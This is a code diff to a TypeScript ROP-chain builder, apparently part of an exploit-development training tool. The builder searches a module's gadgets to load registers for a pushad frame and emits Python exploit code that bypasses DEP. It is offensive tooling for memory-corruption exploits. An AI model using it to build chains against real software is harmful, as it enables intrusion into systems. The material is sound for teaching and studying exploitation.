@@ -1,7 +1,8 @@
 import { CapabilityIndex } from "../rop/capabilities";
 import { rankCandidates } from "../rop/emitter";
 import { RopGadget } from "../rop/types";
-import { ValueRecipe } from "../rop/value_solver";
+import { buildRopIndexFromRpPlusText } from "../rop";
+import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, effectOf, isPath } from "../rop/reach";
 import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
 
@@ -80,9 +81,9 @@ export type Entry = { name: string; address: number; sequence: string; pops: num
  * COST too, so swapping is moving the comment marker and nothing else. */
 export type Swap = { address: number; sequence: string; pops: number; retn: number; why: string };
 
-type Op = { call: Entry; values: string[]; times?: number } | { line: string };
-
-export type Recipe = { register: string; value: number; keep: string[]; label: string };
+// `note` is what the gadget leaves in the registers the load needs, printed after the call so each line
+// can be checked against the debugger.
+type Op = { call: Entry; values: string[]; times?: number; note?: string } | { line: string };
 
 export type BuildInput = {
   api: DepApi;
@@ -103,7 +104,6 @@ export type BuildInput = {
   /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
    * as that complete function, so his file grows by appending and every function is one thing he sends. */
   stage: number;
-  solve: (register: string, value: number, keep: string[]) => ValueRecipe | undefined;
 };
 
 /** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
@@ -112,7 +112,9 @@ export type Delta = { dll: string; anchor: string; value: number };
 // A section either has code to copy or a reason why it has none. There is no empty block.
 export type Block = { lines: string[] } | { none: string };
 
-export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; recipes: Recipe[]; stages: number[] };
+/** `routes` is one line per register the loaders fill: the gadgets the search chose, in order, and why it
+ * chose them. It is evidence, so it prints above the separator, and the code it describes is in [5/7]. */
+export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; stages: number[]; routes: string[] };
 
 const JUNK = /^(junk|padding)/;
 const REGISTERS = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
@@ -158,7 +160,10 @@ function popsAfterPivot(gadget: RopGadget): number {
 // so a gadget that starts with one takes the next instruction into its name too.
 export function gadgetName(sequenceText: string): string {
   const parts = sequenceText.split(" ; ");
-  const used = parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
+  // A push with a pop later is a move through the stack, and is named for the two ends of it.
+  const pop = parts.findIndex((part, i) => i > 0 && part.indexOf("pop ") === 0);
+  const used = parts[0].indexOf("push ") === 0 && pop > 0 ? [parts[0], parts[pop]]
+    : parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
   return used.join(" ")
     .replace(/\b(dword|word|byte)\b ?/g, "")
     .replace(/\[\s*(e[a-z]{2})[^\]]*\]/g, "mem $1")
@@ -222,7 +227,6 @@ export function buildExploit(input: BuildInput): Build {
   const gadgets = (index?.gadgets ?? []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
   const table: Entry[] = [];
   const holes: string[] = [];
-  const recipes: Recipe[] = [];
   const byAddress: Record<number, RopGadget> = {};
   for (const gadget of gadgets) byAddress[gadgetAddress(gadget)] = gadget;
   const pick = (key: string): Verdict | undefined => input.plans.filter((plan) => plan.job.key === key)[0]?.pick;
@@ -232,8 +236,11 @@ export function buildExploit(input: BuildInput): Build {
   // payload. A candidate rejected for clobbering a live register is not a fallback, it is a trap, so it
   // never appears here.
   const swapsFor = (address: number, loads: number): Swap[] => {
+    // A gadget the loader search chose has its twins from the search; one from a job pick has them from
+    // that job's ranking. Both are drop-ins for the same reason, so they render as one list.
+    const fromSearch = (searchSwaps[address] ?? []).filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i).slice(0, 2);
     const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
-    if (!plan || !plan.pick) return [];
+    if (!plan || !plan.pick) return fromSearch;
     const chosen = plan.pick;
     // Drop-in means the chain's arithmetic does not move: the same operands, the same offset, and
     // nothing running before the instruction that does the job. `mov [ecx+0x8]` is not a swap for
@@ -253,7 +260,10 @@ export function buildExploit(input: BuildInput): Build {
         pops: extraPops(verdict.gadget, loads),
         retn: lastRetN(verdict.gadget),
         why: sideEffects(verdict.gadget, plan.job),
-      }));
+      }))
+      .concat(fromSearch)
+      .filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i && swap.address !== address)
+      .slice(0, 2);
   };
 
   // Carried into the emitted comment, not only into the evidence: the comment is what survives into his file.
@@ -279,10 +289,19 @@ export function buildExploit(input: BuildInput): Build {
   const ref = (target: Entry): string => `\u0001${refs.push(target) - 1}\u0001`;
 
   // A value no static analysis can give: the comment carries the command that produces it, and hole()
-  // stops the script instead of letting a plausible-looking wrong value reach the target.
+  // stops the script instead of letting a plausible-looking wrong value reach the target. A reason given
+  // in several sentences becomes a comment per line, so a long one reads as a block instead of running
+  // off the screen; the verdict still gets it as one line.
   const hole = (target: string, how: string): Op[] => {
-    holes.push(`${target}: ${how}`);
-    return [{ line: `# ${target}: ${how}` }, { line: `${target} = hole(${JSON.stringify(target)})` }];
+    const [first, ...rest] = how.split("\n");
+    // The verdict counts holes and names each one, so it takes the first sentence. The rest is the detail
+    // behind that sentence and belongs beside the hole() line, once, where the reader is already looking.
+    holes.push(`${target}: ${first}`);
+    return [
+      { line: `# ${target}: ${first}` },
+      ...rest.map((line) => ({ line: `#   ${line}` })),
+      { line: `${target} = hole(${JSON.stringify(target)})` },
+    ];
   };
 
   // Opens a group of chain lines. Every c.rop in the chain sits under one, so the lines that built a field
@@ -323,66 +342,153 @@ export function buildExploit(input: BuildInput): Build {
     return undefined;
   };
 
-  const recipeOps = (recipe: ValueRecipe, job: string): Op[] => {
-    const ops: Op[] = [];
-    recipe.steps.forEach((step, i) => {
-      if (step.kind !== "gadget" || step.address === undefined) return;
-      const values: string[] = [];
-      for (let j = i + 1; j < recipe.steps.length && recipe.steps[j].kind === "value"; j += 1) {
-        if (!JUNK.test(recipe.steps[j].comment)) values.push(hex(recipe.steps[j].value ?? 0));
+  // Commands in the emitted comments take the bad chars written out, the way the user passed them. A
+  // `<bad chars>` placeholder in a command the run could fill is the automatic rule failing.
+  const badSpaced = badchars.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join(" ");
+
+  // One search per load. The scratch dword lets a value go through memory when no register route exists.
+  const reachIndex = new ReachIndex(gadgets);
+  const scratch = input.writable !== undefined && isClean(input.writable, badchars) ? { at: input.writable, text: "WRITABLE" } : undefined;
+
+  // The gadget shapes the unreachable sentence tries, one at a time, to name the single one that would
+  // have opened a path. Each is checked by rerunning the search with it added, never assumed.
+  const unlockShapes = (register: string): string[] => [
+    `pop ${register}`, `mov ${register}, dword [${register}]`,
+    ...REGISTERS.filter((other) => other !== register).map((other) => `mov ${register}, ${other}`),
+    ...REGISTERS.filter((other) => other !== register).map((other) => `xchg ${register}, ${other}`),
+    ...REGISTERS.filter((other) => other !== register).map((other) => `add ${register}, ${other}`),
+    `neg ${register}`,
+  ];
+  const unlock = (register: string, goal: Val, keep: string[]): { shape: string; route: string; hops: number } | undefined => {
+    const shapes = unlockShapes(register);
+    const synthetic = buildRopIndexFromRpPlusText(shapes.map((shape, i) => `0x${(0x7f000010 + i * 0x10).toString(16)}: ${shape} ; ret ;  (1 found)`).join("\n")).gadgets;
+    let found: { shape: string; route: string; hops: number } | undefined;
+    for (const gadget of synthetic) {
+      const effect = effectOf(gadget);
+      if (!effect) continue;
+      const result = reachIndex.plus([effect]).reach(register as Reg, goal, { bad: badchars, keep, scratch, maxNodes: 4000 });
+      if (isPath(result) && (!found || result.hops.length < found.hops)) {
+        found = { shape: sequence(gadget), route: result.hops.map((hop) => hop.kind).join(", "), hops: result.hops.length };
       }
-      const gadget = byAddress[Number(step.address)];
-      // A recipe address the scan did not produce has no cost here, so its extra pops would go unpaid and
-      // the chain would derail silently. Say so in the file instead.
-      ops.push({
-        call: gadget
-          ? entry(gadget, job, values.length)
-          : row(Number(step.address), `${step.comment}   <<< not in the scanned corpus: check its extra pops and ret N by hand`, job),
-        values,
-      });
-    });
+    }
+    return found;
+  };
+
+  // What the search covered, in the terms of the thing it searched: how many distinct effects on the
+  // register the module gave it, how deep it looked, and whether it ran out of module or of budget. Three
+  // lengths, because the same sentence has to sit in three places and only one of them has room: `full`
+  // beside the hole() line, which is its one home, `short` in the route list, and `brief` in [7/7].
+  const unreachable = (register: string, goal: Val, keep: string[], name: string, result: Unreached): Written => {
+    const kept = keep.length > 0 ? ` that ${result.providers === 1 ? "keeps" : "keep"} ${keep.join(", ")}` : ", with nothing to keep";
+    const pool = `${result.providers} distinct way${result.providers === 1 ? "" : "s"} to write ${register}`;
+    const searched = result.exhausted
+      ? `searched: ${input.module} gives ${pool}${kept}. No combination of up to ${result.maxHops} of them reaches it.`
+      : `searched: ${input.module} gives ${pool}${kept}. The search gave up after ${result.searched} states, short of ${result.maxHops} gadgets.`;
+    const key = unlock(register, goal, keep);
+    const fix = key
+      ? `one gadget would unlock it: ${key.shape}, which the search then finishes in ${key.hops} gadget${key.hops === 1 ? "" : "s"} (${key.route}).\nconfirm it is really absent before changing module: dx @$osed().palette("${input.module}", "${badSpaced}")`
+      : `no single pop, mov, xchg, deref, add or neg of ${register} would unlock it either, so the value is out of reach in this module whatever gadget turned up.`;
+    // The route line names the width of the search and the missing piece; the sentence that spells out
+    // what each means is the hole below it, so this one points there instead of repeating it.
+    const narrow = `the ${result.providers} way${result.providers === 1 ? "" : "s"} ${input.module} writes ${register}${keep.length > 0 ? ` while keeping ${keep.join(", ")}` : ""}`;
+    return {
+      brief: `no route, so load_${ident(name)} below is a hole`,
+      short: `no route among ${narrow}. ${key ? `${key.shape} would unlock it` : "No pop, mov, xchg, deref, add or neg of it would either"}; load_${ident(name)} below says what was searched.`,
+      full: `${register} = ${name} (${describe(goal)}) cannot be reached.\n${searched}\n${fix}`,
+    };
+  };
+
+  // A hop's lower-ranked twins. They do the same thing to the same register, so swapping one in is moving
+  // the comment marker, and their cost rows are emitted with the chosen one's.
+  const searchSwaps: Record<number, Swap[]> = {};
+
+  /** One line per loader: the route and why it won, for the evidence above the [5/7] separator. */
+  const routes: string[] = [];
+  /** The same decision at a width [7/7] can carry, keyed by the loader it belongs to. */
+  const briefs: Record<string, string> = {};
+  const said: string[] = [];
+  // Every loader gets a line in both places, so counting them against the [6/7] register map comes out
+  // even and no register is left looking unsearched when it was, or searched when it was not.
+  const say = (register: string, name: string, value: string, long: string, brief: string): void => {
+    routes.push(`${register} = ${name} (${value}): ${long}`);
+    briefs[`load_${ident(name)}`] = `${register} = ${name}: ${brief}`;
+    said.push(`load_${ident(name)}`);
+  };
+
+  // The same question is asked more than once: the pushad order is tried before any loader is written,
+  // and then every loader asks again. A search over a real module's corpus costs tens of milliseconds, so
+  // on WinDbg's engine the repeats are the difference between a pause and a wait. The answer depends only
+  // on the register, the value and its text, and what must be kept; the bad chars and the scratch dword
+  // are fixed for the whole build.
+  const answers: Record<string, Path | Unreached> = {};
+  const reachPath = (register: string, goal: Val, keep: string[]): Path | Unreached => {
+    const key = `${register}|${goal.mem?.at ?? ""}|${goal.k}|${goal.text}|${keep.slice().sort().join(",")}`;
+    if (!answers[key]) answers[key] = reachIndex.reach(register as Reg, goal, { bad: badchars, keep, scratch });
+    return answers[key];
+  };
+
+  /** One decision at three widths: [7/7] has a comment's worth, the route list a line, the hole a block. */
+  type Written = { brief: string; short: string; full: string };
+
+  // register = goal without writing `keep`, as a route the reader can check gadget by gadget.
+  const reachOps = (register: string, goal: Val, keep: string[], name: string): Op[] | { missing: string } => {
+    const result = reachPath(register, goal, keep);
+    if (!isPath(result)) {
+      const why = unreachable(register, goal, keep, name, result);
+      say(register, name, describe(goal), why.short, why.brief);
+      return { missing: why.full };
+    }
+    const ops: Op[] = [];
+    const kinds = result.hops.map((hop) => hop.kind).join(", ");
+    if (result.hops.length > 1) {
+      const why = goal.mem ? "read at run time" : isClean(goal.k, badchars) ? "built" : "has bad bytes, so built";
+      ops.push({ line: `# ${register} = ${describe(goal)}, ${why}: ${kinds}` });
+    }
+    const names: string[] = [];
+    for (const hop of result.hops) {
+      const values = hop.values.map((value) => (value ? value.text : "0x41414141"));
+      const row = entry(hop.gadget, `${register} = ${name}`, values.length);
+      names.push(ref(row));
+      searchSwaps[row.address] = (searchSwaps[row.address] ?? []).concat(hop.alts
+        .filter((alt) => input.exclude.indexOf(gadgetAddress(alt.gadget)) < 0)
+        .map((alt) => ({
+          address: gadgetAddress(alt.gadget), sequence: sequence(alt.gadget),
+          pops: extraPops(alt.gadget, values.length), retn: lastRetN(alt.gadget), why: alt.why,
+        })));
+      ops.push({ call: row, values, note: hop.notes.join("; ") });
+    }
+    // Why this route and not a shorter one. A value the chain cannot send as a dword is the reason no
+    // single pop does it, and naming that reason is what makes the extra gadgets defensible; the rest the
+    // search settled by cost over every state it expanded.
+    const dirty = badchars.filter((b) => [0, 8, 16, 24].some((s) => ((goal.k >>> s) & 0xff) === b))
+      .map((b) => b.toString(16).padStart(2, "0")).join(" ");
+    const why = result.hops.length === 1 ? `a direct ${result.hops[0].kind}`
+      : goal.mem ? `${result.hops.length} gadgets: the value is the dword at ${goal.mem.text}, known only at run time`
+        : !isClean(goal.k, badchars) ? `${result.hops.length} gadgets: no pop can send ${hex(goal.k)}, which holds ${dirty}`
+          : `${result.hops.length} gadgets, cheapest of ${result.searched} state${result.searched === 1 ? "" : "s"}`;
+    say(register, name, describe(goal), `${names.join(" -> ")}. ${why}`, `${names.join(" -> ")}`);
     return ops;
   };
-
-  // register = value without touching `keep`: a clean value is one pop, a dirty one is a [5/7] recipe,
-  // built in the register itself or in a scratch register and moved.
-  const tryConstOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] | undefined => {
-    if (isClean(value, badchars)) {
-      const pop = popGadget(register, keep);
-      if (pop) return [{ call: entry(pop, `load ${register}`, 1), values: [expression] }];
-    }
-    const direct = input.solve(register, value, keep);
-    if (direct) {
-      recipes.push({ register, value, keep, label });
-      return recipeOps(direct, `${label}`);
-    }
-    for (const scratch of REGISTERS) {
-      if (scratch === register || keep.indexOf(scratch) >= 0) continue;
-      const recipe = input.solve(scratch, value, keep);
-      const move = recipe ? moveOps(scratch, register, keep) : undefined;
-      if (recipe && move) {
-        recipes.push({ register: scratch, value, keep, label });
-        return [...recipeOps(recipe, label), ...move];
+  const lone = (): RopGadget | undefined => rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
+  const skipper = (): RopGadget | undefined => rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
+  // What the search must leave in the register for a slot, without adding anything to the table: the
+  // pushad order is tried with this before a single loader is written.
+  const goalOf = (slot: Slot): Val | undefined => {
+    const source = slot.source;
+    switch (source.kind) {
+      case "api": return input.iatSlot === undefined ? undefined
+        : { mem: { at: input.iatSlot, text: "IAT_SLOT" }, k: input.delta?.value ?? 0, text: input.delta ? "API_DELTA" : "0" };
+      case "const": return constVal(source.value);
+      case "named": {
+        const value = source.name === "WRITABLE" ? input.writable : input.cave;
+        return value === undefined ? undefined : constVal(value, source.name);
       }
+      case "nops": return constVal(0x90909090);
+      case "ropnop": { const ret = lone(); return ret ? constVal(gadgetAddress(ret), "RET") : undefined; }
+      case "jmpesp": return input.jmpEsp === undefined ? undefined : constVal(input.jmpEsp, "JMP_ESP");
+      case "skip3": { const skip = skipper(); return skip ? constVal(gadgetAddress(skip), "SKIP3") : undefined; }
+      default: return undefined;
     }
-    return undefined;
-  };
-  const constOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] =>
-    tryConstOps(register, value, expression, keep, label)
-    ?? hole(`${register}_value`, `${register} = ${hex(value)} (${label}): no pop and no rop.construct recipe keeps ${keep.join(", ") || "the chain"}`);
-
-  // register += value through a register `keep` does not need: loaded by a pop or a recipe, then added.
-  const addConst = (register: string, value: number, expression: string, keep: string[]): Op[] | undefined => {
-    const adders = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
-      capability.kind === "REGISTER_ADD" && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
-      && capability.targetRegister !== register && keep.indexOf(capability.targetRegister ?? "") < 0)
-      && usable(gadget, keep, [register]))));
-    for (const gadget of adders) {
-      const by = gadget.capabilities.filter((capability) => capability.kind === "REGISTER_ADD" && capability.register === register)[0].targetRegister ?? "";
-      const ops = tryConstOps(by, value, expression, keep.concat(register), `${by} = ${expression}`);
-      if (ops) return [...ops, { call: entry(gadget, `add ${expression}`), values: [] }];
-    }
-    return undefined;
   };
 
   const capture = pick("capture");
@@ -418,58 +524,52 @@ export function buildExploit(input: BuildInput): Build {
     const source = slot.source;
     // `_value` keeps the target a legal identifier: a slot called "return" would otherwise emit `return = ...`.
     const missing = (why: string): Op[] => hole(`${ident(slot.name)}_value`, why);
+    const to = (goal: Val | undefined, why: string): Op[] => {
+      if (!goal) return missing(why);
+      const ops = reachOps(register, goal, keep, slot.name);
+      return "missing" in ops ? missing(ops.missing) : ops;
+    };
     switch (source.kind) {
-      case "api": {
-        if (!read?.at.address || input.iatSlot === undefined) return missing("no gadget reads the IAT slot");
-        const offset = read.at.offset ?? 0;
-        const expression = offset ? `IAT_SLOT ${offset < 0 ? "+" : "-"} ${hex(Math.abs(offset))}` : "IAT_SLOT";
-        const move = moveOps(read.at.dest ?? "", register, keep);
-        if (!move) return missing(`no gadget moves ${read.at.dest} into ${register}`);
-        // The distance goes on where an add exists: in the register the read left the pointer in, or after the move.
-        const before = input.delta && read.at.dest ? addConst(read.at.dest, input.delta.value, "API_DELTA", keep) : [];
-        const after = before ? [] : addConst(register, input.delta?.value ?? 0, "API_DELTA", keep);
-        if (!before && !after) return missing(`no gadget adds API_DELTA to ${read.at.dest} or ${register} through a register the chain does not need here`);
-        return [...constOps(read.at.address, (input.iatSlot - offset) >>> 0, expression, keep, `${read.at.address} = ${expression}`),
-          { call: entry(read.gadget, "read the IAT slot"), values: [] }, ...(before ?? []), ...move, ...(after ?? [])];
-      }
+      case "api":
+        return to(goalOf(slot), "no IAT slot to read: see [2/7]");
       case "const":
-        return constOps(register, source.value, hex(source.value), keep, `${slot.name} = ${hex(source.value)}`);
+        return to(constVal(source.value), "");
       case "named": {
         const value = source.name === "WRITABLE" ? input.writable : input.cave;
-        return value === undefined
-          ? missing(`no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "<bad chars>", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`)
-          : constOps(register, value, source.name, keep, slot.name);
+        return to(value === undefined ? undefined : constVal(value, source.name),
+          `no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "${badSpaced}", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`);
       }
       case "nops":
-        return constOps(register, 0x90909090, "0x90909090", keep, "four NOPs");
+        return to(constVal(0x90909090), "");
       case "ropnop": {
-        const ret = rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
-        const pop = popGadget(register, keep);
-        if (!ret || !pop) return missing(ret ? `no pop ${register} in ${input.module}` : `no lone ret in ${input.module}`);
-        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(entry(ret, "ROP NOP"))] }];
+        const ret = lone();
+        return to(ret ? constVal(gadgetAddress(ret), ref(entry(ret, "ROP NOP"))) : undefined, `no lone ret in ${input.module}`);
       }
-      case "jmpesp": {
-        const pop = popGadget(register, keep);
-        if (input.jmpEsp === undefined || !pop) return missing(input.jmpEsp === undefined ? `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)` : `no pop ${register} in ${input.module}`);
-        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(row(input.jmpEsp, "jmp esp", "return into the stack"))] }];
-      }
+      case "jmpesp":
+        return to(input.jmpEsp === undefined ? undefined : constVal(input.jmpEsp, ref(row(input.jmpEsp, "jmp esp", "return into the stack"))),
+          `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)`);
       case "skip3": {
-        const skip = rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
-        const pop = popGadget(register, keep);
-        if (!skip || !pop) return missing(`no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
-        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))] }];
+        const skip = skipper();
+        return to(skip ? constVal(gadgetAddress(skip), ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))) : undefined,
+          `no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
       }
       case "size": {
+        // The only value the search cannot own: the script picks it at run time, growing it until the
+        // negative is clean, so there is no number here to test against the bad chars.
         const pop = popGadget(register, keep);
-        if (!negate || negate.at.dest !== register || !pop) return missing(`no pop and neg for ${register}`);
-        return [{ call: entry(pop, `load ${register}`, 1), values: ["neg(size)"] }, { call: entry(negate.gadget, "negate"), values: [] }];
+        if (!negate || negate.at.dest !== register || !pop) return missing(`no pop and neg for ${register}: the size is negated at run time, so it needs both in ${register}`);
+        say(register, slot.name, "chosen at run time", `POP then NEG, the only load the search does not own: the script grows size until neg(size) is clean`, "popped negated, then negated back");
+        return [
+          { call: entry(pop, `load ${register}`, 1), values: ["neg(size)"], note: `${register} = neg(size), kept clean by the loop above` },
+          { call: entry(negate.gadget, "negate"), values: [], note: `${register} = -${register}, now size` },
+        ];
       }
       case "shellcode": {
         const math = arithmetic(register, keep);
         const move = moveOps(field, register, keep);
         if (style !== "skeleton" || !math || !move) {
           return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register}`
-            : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp <pushad gadget> ; g ; s -b esp L400${" 90".repeat(16)}`);
+            : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick("pushad") ? hex(gadgetAddress(pick("pushad")!.gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
         }
         return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: ["0"] }, { call: math.op, values: [] }];
       }
@@ -480,8 +580,15 @@ export function buildExploit(input: BuildInput): Build {
   const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
     const fn = `load_${ident(slot.name)}`;
     const params = slot.source.kind === "shellcode" ? "c, field" : slot.source.kind === "size" ? "c, size" : "c";
-    loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 28 - fn.length - params.length))}# ${register} = ${slot.name}` });
+    loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 34 - fn.length - params.length))}# ${register} = ${slot.name}` });
+    const holesBefore = holes.length;
     for (const op of load(slot, register, keep)) loaders.push("call" in op ? op : { line: op.line });
+    // A load that never reached the search has no route of its own: the value it wanted was missing before
+    // any gadget mattered. Saying that is what keeps the list even with the register map.
+    if (said.indexOf(fn) < 0) {
+      const why = holes.length > holesBefore ? holes[holesBefore].slice(holes[holesBefore].indexOf(": ") + 2) : "built from the frame, not searched for";
+      say(register, slot.name, "no value to search for", `not searched: ${why}`, `not searched: ${why}`);
+    }
     return fn;
   };
 
@@ -531,6 +638,7 @@ export function buildExploit(input: BuildInput): Build {
           at = i;
         }
         const args = slot.source.kind === "shellcode" ? `c, ${i + 1}` : slot.source.kind === "size" ? "c, size" : "c";
+        if (briefs[fn]) chain.push({ line: `# ${briefs[fn]}` });
         chain.push({ line: `${fn}(${args})` });
         chain.push({ call: entry(write.gadget, "write the field"), values: [] });
       });
@@ -565,7 +673,23 @@ export function buildExploit(input: BuildInput): Build {
       );
     }
   } else {
-    const slots = PUSHAD_FRAMES[api];
+    // Each loaded register is kept by every load after it, so a register blocked only by what the ones
+    // before it hold is reachable if it goes first. Such a register moves to the front and the order is
+    // tried again. A register the module cannot reach at all stays put: moving it buys nothing and would
+    // reorder the frame for no gain, so the test is whether it reaches with nothing kept.
+    let slots = PUSHAD_FRAMES[api].slice();
+    for (let tries = 0; tries < slots.length; tries += 1) {
+      const kept: string[] = [];
+      const stuck = slots.find((slot) => {
+        const register = slot.register ?? "eax";
+        const goal = goalOf(slot);
+        const blocked = goal !== undefined && kept.length > 0 && !isPath(reachPath(register, goal, kept)) && isPath(reachPath(register, goal, []));
+        kept.push(register);
+        return blocked;
+      });
+      if (!stuck) break;
+      slots = [stuck, ...slots.filter((slot) => slot !== stuck)];
+    }
     const loaded: string[] = [];
     const order = slots.map((slot) => {
       const fn = defineLoader(slot, slot.register ?? "eax", loaded.slice());
@@ -575,6 +699,9 @@ export function buildExploit(input: BuildInput): Build {
     frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`];
     const dispatch = pick("pushad");
     chain.push(group("the seven registers, in the order [6/7] fixes"));
+    // One line per register, so the [7/7] screenshot shows the route each one took without scrolling to
+    // the loader that walks it. The loaders themselves carry what every gadget does to the registers.
+    for (const fn of order) chain.push({ line: `# ${briefs[fn] ?? fn}` });
     chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
     chain.push(group("dispatch: pushad writes the whole frame at once"));
     if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
@@ -605,7 +732,8 @@ export function buildExploit(input: BuildInput): Build {
   const render = (ops: Op[], indent: string): string[] => ops.map((op) => {
     if ("line" in op) return op.line === "" ? "" : `${indent}${resolve(op.line)}`;
     const call = `c.rop(${[op.call.name, ...op.values.map(resolve)].join(", ")})`;
-    return `${indent}${op.times && op.times > 1 ? `for _ in range(${op.times}): ${call}` : call}`;
+    const line = `${indent}${op.times && op.times > 1 ? `for _ in range(${op.times}): ${call}` : call}`;
+    return op.note ? `${line}${" ".repeat(Math.max(2, 44 - line.length))}# ${resolve(op.note)}` : line;
   });
   const loaderLines = render(loaders, "    ").map((line) => line.indexOf("    def ") === 0 ? line.slice(4) : line);
 
@@ -618,7 +746,7 @@ export function buildExploit(input: BuildInput): Build {
     table,
     stages,
     holes: slot.hole ? [slot.hole, ...holes] : holes,
-    recipes,
+    routes: routes.map(resolve),
     blocks: {
       1: HELPER_BLOCK,
       2: slot.block,
